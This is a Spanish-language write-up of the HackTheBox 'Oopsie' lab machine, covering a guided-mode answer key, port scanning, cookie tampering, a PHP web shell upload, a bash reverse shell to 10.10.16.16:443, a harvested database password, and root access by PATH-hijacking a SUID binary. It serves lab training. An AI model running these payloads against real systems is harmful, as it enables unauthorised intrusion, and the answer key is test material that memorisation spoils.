#easy #linux #nmap #ping

------
# Guided Mode

1)¿Con qué tipo de herramienta se puede interceptar el tráfico web?
	proxy

2)¿Cuál es la ruta al directorio en el servidor web que devuelve una página de inicio de sesión?
	/cdn-cgi/login

3)¿Qué se puede modificar en Firefox para acceder a la página de carga?
	cookie

4)¿Cuál es el ID de acceso del usuario admin?
	34322

5)Al cargar un archivo, ¿en qué directorio aparece ese archivo en el servidor?
	/uploads

6)¿Cuál es el archivo que contiene la contraseña que se comparte con el usuario robert?
	db.php

7)¿Qué ejecutable se ejecuta con la opción «-group bugtracker» para identificar todos los archivos propiedad del grupo bugtracker?
	find

8)Independientemente del usuario que inicie la ejecución del ejecutable bugtracker, ¿qué privilegios de usuario utilizará para ejecutarlo?
	root

9)¿Qué significa SUID?
	set owner user id

10)¿Cuál es el nombre del ejecutable al que se llama de forma insegura?
	cat


-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.207.226
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.207.226 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.207.226 -oN target
```

![[Oopsie1.png]]

![[Oopsie2.png]]
Por el ttl cercano a 64 es una maquina linux
*Puertos*
`22` SSH
`80`HTTP apache


----
# [[Whatweb-wappalyzer]]

![[Oopsie3.png]]

No nos da ningun dato relevante

------
# Vamos a interceptar con [[Caido]]

Aceptamos la primera peticion de la pagina, para que pase todo el trafico asi se genera un sitemap

![[Oopsie5.png]]
Ahora tenemos una carpeta que se llama cdn-cgi
Con [[Gobuster]] `gobuster dir -u http://10.129.207.226/cdn-cgi/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 50` vamos a buscar posibles directorios y nos da que existe el directorio login

![[Oopsie4.png]]

--------
# Ingreso al panel de login

http://10.129.207.226/cdn-cgi/login/

![[Oopsie6.png]]
Entramos con ``login as a guest``

Ahora vamos a account
![[Oopsie7.png]]

Y vemos que somos el usuario id 2, normalmente el usuario admin es el id 1 por que es el primero en crearse
![[Oopsie8.png]]

Cambiamos el link a `http://10.129.207.226/cdn-cgi/login/admin.php?content=accounts&id=1`

![[Oopsie9.png]]
Y vemos el id del usuario admin, ahora vamos a cambiar los valores de la cookie para robarnos las credenciales

------
# [[Cookie Hijacking]]

Con el user id 34322 y el name de admin, que sacamos antes, vamos a apretar en el navegador CTRL + SHIFT + I
Se nos va a abrir esto y vamos a cambiar el valor role `guest` a `admin` y el valor de user `2233` a `34322`

![[Oopsie10.png]]
Reiniciamos y la pagina, y ya estamos como el usuario admin

---------
# [[Arbitrary file upload]]

![[Oopsie12.png]]

Desde la parte de uploads, vamos a cargar un [[archivo php inyección comandos]]

`test.php`
```
<?php system($_GET["cmd"]); ?>
```
Lo subimos con este contenido, en uno de nuestros primeros intentos de enumerar, habiamos visto que existe el directorio uploads
![[Oopsie11.png]]

Entonces desde el directorio uploads vamos a intentar inyectar comandos con la utilidad que subimos
http://10.129.207.226/uploads/test.php?cmd=whoami
![[Oopsie13.png]]
Nos responde www-data asi que funciona correctamente

------
# [[Reverse shell]]

Con el archivo que subimos antes, vamos a ejecutar la revershell
http://10.129.207.226/uploads/test.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.16/443 0>%261'

![[Oopsie14.png]]
Mientras estamos en escucha con [[nc -nlvp 443]]

![[Oopsie16.png]]
Ya estamos dentro de la maquina, ahora hacemos un [[Tratamiento de la TTY]]


-----------
# Escalada de al usuario robert

Dentro de la carpeta /var/www/html/cdn-cgi ssamos el comando grep -riE "connect|.*connect|connect.*"   para buscar posibles contraseñas 


![[Oopsie20.png]]

Da como resultado ``M3g4C0rpUs3r!``
![[Oopsie19.png]]

------
# Escala a root mediante binario del grupo bugtracker

Vemos con [[id]] que estamos en el grupo bugtracker
Usamos el  comando [[find]] ``find / -group bugtraker 2>/dev/null`` para buscar archivos que pueda ejecutar por estar en este grupo

![[Oopsie23.png]]
Y tenemos que podemos usar el binario */usr/bin/bugtracker*
Al listar los permisos que tiene con [[ls]] `ls -l` vemos que es [[SUID]] y el usuario es root. 
![[Oopsie25.png]]

Al ejecutarlo me pide un id de bug, ponemos prueba y vamos que lo que esta haciendo el binario es un cat

![[Oopsie24.png]]
Entonces sacamos la conclusion de que estamos ejecutando el [[cat]] como si fueramos root

--------
# [[Path Hijacking]] al comando cat

Agregamos en el PATH el directorio /tmp. y en ese directorio creamos el archivo cat con el contenido `/bin/bash` para que cuando lo ejecutemos nos abra una bash. Le damos permisos de ejecucion con [[chmod]] `chmod +x cat` . Y ejecutamos el binario, ponemos cualquier id de bug. Y ya se nos abre la bash con privilegios de root, y podemos catear la flag

```shell
export PATH=/tmp:$PATH          /Agrega al principio del PATH el directorio tmp
echo "/bin/bash" > cat          /Crea el archivo cat, con el contenido /bin/bash
chmod +x cat                    /Da permisos de ejecucion al comando cat
/usr/bin/bugtracker             /Ejecuta el binario
```

![[Oopsie27.png]]
![[Oopsie28.png]]

-------
# Notas

Para el sitemap si usamos caido, no nos va a detectar el directorio login, pero con burpsuite

------
# Creditos
Writeup oficial HackTheBox